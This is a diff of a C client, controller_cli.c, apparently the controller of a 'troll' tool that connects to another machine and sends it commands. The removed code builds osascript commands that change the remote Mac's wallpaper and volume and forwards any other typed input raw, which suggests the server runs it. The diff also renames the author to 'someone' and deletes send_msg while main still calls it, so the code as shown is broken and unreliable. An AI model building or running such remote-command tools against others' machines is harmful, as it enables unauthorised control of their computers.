@@ -1,14 +1,14 @@
-/* ************************************************************************** */
+/* ******************************--------************************************ */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
 /*   controller_cli.c                                   :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: kdumarai <kdumarai@student.42.fr>          +#+  +:+       +#+        */
+/*   By: someone <someone@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2018/02/17 01:05:22 by kdumarai          #+#    #+#             */
-/*   Updated: 2018/02/18 06:49:27 by kdumarai         ###   ########.fr       */
+/*   Created: 2018/mm/dd hh:mm:ss by someone           #+#    #+#             */
+/*   Updated: 2018/mm/dd hh:mm:ss by someone          ###   ########.troll    */
 /*                                                                            */
-/* ************************************************************************** */
+/* ******************************--------************************************ */
 
 #include <stdlib.h>
 #include <unistd.h>
@@ -44,83 +44,48 @@ static void		print_output(int sockfd)
 	ft_strdel(&buff);
 }
 
-static void		send_cmd(int sockfd, char *line)
+static void		show_retry_msg(int tries)
 {
-	char	*cmd;
-	char	*chk;
-
-	chk = ft_strchr(line, ' ');
-	if (ft_strstart(line, "chgwall"))
-	{
-		cmd = ft_strdup("osascript -e 'tell application \"System Events\" to ");
-		ft_stradd(&cmd, "tell desktop 1 to set picture to ");
-		ft_stradd(&cmd, (chk) ? chk + 1 : chk);
-		ft_stradd(&cmd, "'");
-	}
-	else if (ft_strstart(line, "setvol"))
-	{
-		cmd = ft_strdup("osascript -e 'tell application \"System Events\" to ");
-		ft_stradd(&cmd, "set volume ");
-		ft_stradd(&cmd, (chk) ? chk + 1 : chk);
-		ft_stradd(&cmd, "'");
-	}
-	else
-		cmd = line;
-	ft_putstr_fd(cmd, sockfd);
-	if (cmd && cmd != line)
-		free(cmd);
+	ft_putstr("Tying again (");
+	ft_putnbr(tries);
+	ft_putchar('/');
+	ft_putnbr(CONTROLLER_LOGTIMEOUT);
+	ft_putendl(")");
+	sleep(1);
 }
 
-static int		send_msg(int sockfd)
+static int		connect_socket(char *hostname)
 {
-	int					ret;
-	char				*msgi;
-	char				buffer[32];
-
-	if (recv(sockfd, buffer, sizeof(buffer), MSG_PEEK | MSG_DONTWAIT) == 0)
-	{
-		ft_putendl_fd("Server kick ya out!", STDERR_FILENO);
-		return (FALSE);
-	}
-	ret = TRUE;
-	ft_putstr("$> ");
-	if (get_next_line(STDIN_FILENO, &msgi) > 0)
-	{
-		if (ft_strcmp(msgi, "exit") == 0)
-			ret = FALSE;
-		else if (ft_strcmp(msgi, "") == 0)
-			ft_putendl_fd("Not a suitable command!", STDERR_FILENO);
-		else
-			send_cmd(sockfd, msgi);
-	}
-	ft_strdel(&msgi);
-	return (ret);
-}
-
-static int		connect_socket(int sockfd, t_sockaddr_in *serv_addr)
-{
-	int					co_ok;
+	int					sockfd;
+	t_sockaddr_in		serv_addr;
+	t_hostent			*server;
 	int					tries;
 
-	co_ok = 1;
 	tries = 0;
-	while (co_ok != 0 && tries < CONTROLLER_LOGTIMEOUT)
+	while (tries < CONTROLLER_LOGTIMEOUT)
 	{
-		if (co_ok == -1)
-			sleep(1);
-		co_ok = connect(sockfd, (t_sockaddr*)serv_addr, sizeof(t_sockaddr_in));
+		if (tries > 0)
+			show_retry_msg(tries);
+		if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+			return (ft_returnmsg("Err socket", STDERR_FILENO, EXIT_FAILURE));
+		if (!(server = gethostbyname(hostname)))
+			return (ft_returnmsg("No such host", STDERR_FILENO, EXIT_FAILURE));
+		ft_bzero(&serv_addr, sizeof(t_sockaddr_in));
+		serv_addr.sin_family = AF_INET;
+		ft_memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
+		serv_addr.sin_port = htons(TROLL_PORT);
+		if (connect(sockfd, (t_sockaddr*)&serv_addr, sizeof(t_sockaddr_in)) == 0)
+			return (sockfd);
 		tries++;
 	}
 	if (tries == CONTROLLER_LOGTIMEOUT)
 		return (FALSE);
-	return (TRUE);
+	return (sockfd);
 }
 
 int				main(int ac, char **av)
 {
 	int					sockfd;
-	t_sockaddr_in		serv_addr;
-	t_hostent			*server;
 
 	if (ac < 2)
 	{
@@ -129,15 +94,7 @@ int				main(int ac, char **av)
 		ft_putendl_fd(" hostname", STDERR_FILENO);
 		return (EXIT_FAILURE);
 	}
-	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-		return (ft_returnmsg("Err socket", STDERR_FILENO, EXIT_FAILURE));
-	if (!(server = gethostbyname(av[1])))
-		return (ft_returnmsg("No such host", STDERR_FILENO, EXIT_FAILURE));
-	ft_bzero(&serv_addr, sizeof(t_sockaddr_in));
-	serv_addr.sin_family = AF_INET;
-	ft_memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
-	serv_addr.sin_port = htons(TROLL_PORT);
-	if (!connect_socket(sockfd, &serv_addr))
+	if (!(sockfd = connect_socket(av[1])))
 		return (ft_returnmsg("Err connect", STDERR_FILENO, EXIT_FAILURE));
 	while (send_msg(sockfd))
 		print_output(sockfd);
